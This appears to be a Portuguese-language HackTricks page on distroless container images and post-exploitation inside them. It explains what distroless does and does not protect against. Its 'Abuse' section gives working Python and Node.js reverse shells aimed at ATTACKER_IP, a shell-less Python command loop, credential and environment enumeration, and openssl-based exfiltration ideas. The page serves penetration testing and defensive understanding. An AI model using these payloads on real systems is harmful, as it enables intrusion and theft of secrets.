# Containers Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Uma imagem de container **distroless** é uma imagem que inclui os **componentes mínimos de runtime necessários para executar uma aplicação específica**, removendo intencionalmente as ferramentas comuns de uma distribuição, como gerenciadores de pacotes, shells e grandes conjuntos de utilitários genéricos de userland. Na prática, as imagens distroless geralmente contêm apenas o binário ou runtime da aplicação, suas bibliotecas compartilhadas, bundles de certificados e um layout de filesystem muito pequeno.

A ideia não é que distroless seja uma nova primitiva de isolamento do kernel. Distroless é uma **estratégia de design de imagem**. Ela altera o que está disponível **dentro** do filesystem do container, não a forma como o kernel isola o container. Essa distinção é importante, porque distroless fortalece o ambiente principalmente reduzindo o que um atacante pode usar após obter code execution. Ela não substitui namespaces, seccomp, capabilities, AppArmor, SELinux ou qualquer outro mecanismo de isolamento de runtime.

## Por que Distroless existe

Imagens distroless são usadas principalmente para reduzir:

- o tamanho da imagem
- a complexidade operacional da imagem
- o número de pacotes e binários que poderiam conter vulnerabilidades
- o número de ferramentas de post-exploitation disponíveis para um atacante por padrão

É por isso que imagens distroless são populares em deployments de aplicações de produção. Um container que não contém shell, gerenciador de pacotes e quase nenhuma ferramenta genérica geralmente é mais fácil de avaliar operacionalmente e mais difícil de abusar interativamente após um compromise.

Exemplos de famílias conhecidas de imagens no estilo distroless incluem:

- imagens distroless do Google
- imagens hardened/minimal da Chainguard

## O que Distroless não significa

Um container distroless **não é**:

- automaticamente rootless
- automaticamente non-privileged
- automaticamente read-only
- automaticamente protegido por seccomp, AppArmor ou SELinux
- automaticamente seguro contra container escape

Ainda é possível executar uma imagem distroless com `--privileged`, compartilhamento de host namespaces, bind mounts perigosos ou um runtime socket montado. Nesse cenário, a imagem pode ser minimal, mas o container ainda pode estar catastróficamente inseguro. Distroless altera a **superfície de ataque do userland**, não o **limite de confiança do kernel**.

## Características operacionais típicas

Quando você compromete um container distroless, a primeira coisa que normalmente percebe é que as suposições comuns deixam de ser verdadeiras. Pode não haver `sh`, `bash`, `ls`, `id`, `cat` e, às vezes, nem mesmo um ambiente baseado em libc que se comporte da forma esperada pelo seu tradecraft habitual. Isso afeta tanto offense quanto defense, porque a ausência de ferramentas torna debugging, incident response e post-exploitation diferentes.

Os padrões mais comuns são:

- o application runtime existe, mas pouco mais está presente
- payloads baseados em shell falham porque não há shell
- one-liners comuns de enumeration falham porque os binários auxiliares estão ausentes
- proteções do filesystem, como read-only rootfs ou `noexec` em locais graváveis de tmpfs, também costumam estar presentes

Essa combinação é o que normalmente leva as pessoas a falar em "weaponizing distroless".

## Distroless e Post-Exploitation

O principal desafio ofensivo em um ambiente distroless nem sempre é o RCE inicial. Muitas vezes, é o que vem depois. Se o workload explorado fornecer code execution em um language runtime, como Python, Node.js, Java ou Go, talvez seja possível executar lógica arbitrária, mas não por meio dos workflows normais centrados em shell que são comuns em outros alvos Linux.

Isso significa que a post-exploitation geralmente segue uma destas três direções:

1. **Usar diretamente o language runtime existente** para enumerar o ambiente, abrir sockets, ler arquivos ou preparar payloads adicionais.
2. **Trazer suas próprias ferramentas para a memória** se o filesystem for read-only ou se os locais graváveis estiverem montados com `noexec`.
3. **Abusar dos binários já presentes na imagem** se a aplicação ou suas dependências incluírem algo inesperadamente útil.

## Abuse

### Enumerar o Runtime que você já possui

Em muitos containers distroless não há shell, mas ainda existe um application runtime. Se o alvo for um serviço Python, Python estará presente. Se o alvo for Node.js, Node estará presente. Isso geralmente fornece funcionalidade suficiente para enumerar arquivos, ler variáveis de ambiente, abrir reverse shells e preparar execução em memória sem jamais invocar `/bin/sh`.

Um exemplo simples com Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Um exemplo simples com Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperação de variáveis de ambiente, geralmente incluindo credenciais ou endpoints de serviço
- enumeração do sistema de arquivos sem `/bin/ls`
- identificação de caminhos graváveis e secrets montados

### Reverse Shell Sem `/bin/sh`

Se a imagem não contiver `sh` ou `bash`, um reverse shell clássico baseado em shell pode falhar imediatamente. Nesse caso, use o language runtime instalado.

Reverse shell em Python:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` não existir, substitua a linha final por execução direta de comandos orientada por Python ou por um loop de REPL do Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Novamente, se `/bin/sh` estiver ausente, use diretamente as APIs de sistema de arquivos, processos e rede do Node, em vez de iniciar um shell.

### Exemplo completo: Loop de comandos Python sem shell

Se a imagem tiver Python, mas nenhum shell, um loop interativo simples geralmente é suficiente para manter toda a capacidade de post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Isso não requer um binário de shell interativo. O impacto é efetivamente o mesmo que o de um shell básico do ponto de vista do atacante: execução de comandos, enumeração e staging de payloads adicionais por meio do runtime existente.

### Execução de ferramentas em memória

Imagens Distroless são frequentemente combinadas com:

- `readOnlyRootFilesystem: true`
- tmpfs gravável, mas com `noexec`, como `/dev/shm`
- ausência de ferramentas de gerenciamento de pacotes

Essa combinação torna pouco confiáveis os workflows clássicos de "baixar o binário para o disco e executá-lo". Nesses casos, as técnicas de execução em memória tornam-se a principal solução.

A página dedicada a isso é:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

As técnicas mais relevantes nessa página são:

- `memfd_create` + `execve` via runtimes de scripting
- DDexec / EverythingExec
- memexec
- memdlopen

### Binários existentes na imagem

Algumas imagens Distroless ainda contêm binários operacionalmente necessários que se tornam úteis após o comprometimento. Um exemplo observado repetidamente é o `openssl`, pois os aplicativos às vezes precisam dele para tarefas relacionadas a criptografia ou TLS.

Um padrão de pesquisa rápido é:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Se `openssl` estiver presente, ele poderá ser usado para:

- conexões TLS de saída
- exfiltração de dados por um canal de saída permitido
- preparação de dados de payload por meio de blobs codificados/criptografados

O abuso exato depende do que está realmente instalado, mas a ideia geral é que distroless não significa "nenhuma ferramenta"; significa "muito menos ferramentas do que uma imagem de distribuição normal".

## Verificações

O objetivo dessas verificações é determinar se a imagem é realmente distroless na prática e quais binários de runtime ou auxiliares ainda estão disponíveis para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
O que é interessante aqui:

- Se não existir nenhum shell, mas houver um runtime como Python ou Node, o post-exploitation deve mudar para uma execução orientada pelo runtime.
- Se o root filesystem for somente leitura e `/dev/shm` for gravável, mas estiver `noexec`, as técnicas de execução em memória se tornam muito mais relevantes.
- Se existirem helper binaries como `openssl`, `busybox` ou `java`, eles podem oferecer funcionalidades suficientes para iniciar um acesso adicional.

## Defaults do Runtime

| Estilo da imagem / plataforma | Estado padrão | Comportamento típico | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Imagens no estilo Google distroless | Userland mínimo por design | Sem shell, sem package manager, apenas dependências da aplicação/runtime | adicionar camadas de debugging, shells sidecar, copiar busybox ou ferramentas |
| Imagens minimalistas Chainguard | Userland mínimo por design | Superfície de packages reduzida, geralmente focada em um runtime ou serviço | usar variantes `:latest-dev` ou de debug, copiar ferramentas durante o build |
| Workloads do Kubernetes usando imagens distroless | Depende da configuração do Pod | Distroless afeta apenas o userland; a postura de segurança do Pod ainda depende da especificação do Pod e dos defaults do runtime | adicionar debug containers efêmeros, host mounts, configurações de Pod privilegiadas |
| Docker / Podman executando imagens distroless | Depende das run flags | Filesystem mínimo, mas a segurança do runtime ainda depende das flags e da configuração do daemon | `--privileged`, compartilhamento de host namespaces, mounts do runtime socket, host binds graváveis |

O ponto principal é que distroless é uma **propriedade da imagem**, não uma proteção do runtime. Seu valor vem da redução do que está disponível dentro do filesystem após o compromise.

## Páginas relacionadas

Para bypasses de filesystem e execução em memória comumente necessários em ambientes distroless:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para abusos de container runtime, socket e mount que ainda se aplicam a workloads distroless:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
